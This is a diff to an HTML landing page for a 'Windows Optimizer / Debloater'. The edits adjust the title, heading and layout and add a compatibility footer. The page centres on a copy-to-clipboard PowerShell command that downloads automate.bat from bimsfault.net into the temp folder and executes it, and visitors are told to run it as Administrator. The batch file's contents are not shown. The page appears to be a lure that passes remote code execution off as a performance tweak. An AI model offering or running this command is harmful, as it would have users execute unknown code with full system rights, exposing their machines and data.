@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Win10 Automatic Optimization Script</title>
+    <title>Windows Automatic Optimization Script</title>
     <link rel="icon" href="icon.png">
     <style>
         body {
@@ -35,17 +35,17 @@
         ul { padding-left: 18px; color: #bbb; font-size: 0.85rem; }
         li { margin-bottom: 10px; }
         .warning { color: #ffa500; font-size: 0.75rem; text-transform: uppercase; }
+        .compatibility { font-size: 0.7rem; margin-top: 50px; color: #555; text-align: center; border-top: 1px solid #1a1a1a; padding-top: 10px; }
     </style>
 </head>
 <body>
 
 <main>
-    <h1>Windows 10 and 11 Optimizer / Debloater</h1>
+    <h1>Windows Optimizer / Debloater</h1>
     <p>A single-command script to declutter and speed up your OS.</p>
 
     <div class="cmd-wrapper" onclick="copyCmd()">
-        <code id="command">powershell -Command "wget 'https://bimsfault.net/automate.bat' -OutFile '%TEMP%\automate.bat'; & '%TEMP%\automate.bat'"
-</code>
+        <code id="command">powershell -Command "wget 'https://bimsfault.net/automate.bat' -OutFile '%TEMP%\automate.bat'; & '%TEMP%\automate.bat'"</code>
     </div>
 
     <div class="details">
@@ -58,9 +58,13 @@
         </ul>
     </div>
 
-    <p style="font-size: 0.7rem; margin-top: 50px;">
+    <p style="font-size: 0.7rem; margin-top: 30px;">
         Click the command box to copy. Run in PowerShell as <b>Administrator</b>.
     </p>
+
+    <div class="compatibility">
+        Supported Systems: Windows 10 and 11
+    </div>
 </main>
 
 <script>
